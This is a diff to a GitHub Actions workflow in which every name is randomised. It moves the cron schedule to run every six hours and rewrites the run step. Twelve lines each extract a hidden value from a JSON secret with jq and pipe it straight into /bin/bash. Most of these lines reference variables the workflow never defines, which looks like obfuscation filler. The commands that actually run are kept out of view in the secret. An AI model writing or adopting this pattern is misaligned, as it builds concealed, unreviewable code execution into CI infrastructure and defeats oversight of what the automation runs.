@@ -2,7 +2,7 @@ name: yinkaldk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 5/6 * * *'
+    - cron: '56 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinkaldk
         env:
-          qbnfv8: ${{ secrets.qbnfv8 }}
+          bwmh26967: ${{ secrets.bwmh26967 }}
         run: |
-          echo $qbnfv8 | jq -r .ab7493 | /bin/bash
-          echo $fwfv31 | jq -r .horql8 | /bin/bash
-          echo $d550 | jq -r .aqyr1446 | /bin/bash
-          echo $dtw10 | jq -r .nru1670 | /bin/bash
-          echo $w84563 | jq -r .ou23062 | /bin/bash
-          echo $uthnp994 | jq -r .bwfre92601 | /bin/bash
-          echo $au5 | jq -r .hdvin68 | /bin/bash
+          echo $bwmh26967 | jq -r .gbiq95832 | /bin/bash
+          echo $vd676 | jq -r .kk9 | /bin/bash
+          echo $clds0194 | jq -r .x17578 | /bin/bash
+          echo $k8 | jq -r .ozc79 | /bin/bash
+          echo $sjsz4762 | jq -r .agiz88 | /bin/bash
+          echo $rq28 | jq -r .jky433 | /bin/bash
+          echo $ognv574 | jq -r .hgmwy8 | /bin/bash
+          echo $uh03075 | jq -r .jtcq31689 | /bin/bash
+          echo $b9591 | jq -r .djvd6 | /bin/bash
+          echo $wk6 | jq -r .z8 | /bin/bash
+          echo $payr801 | jq -r .yxdw5 | /bin/bash
+          echo $mvs4 | jq -r .iosw386 | /bin/bash
 
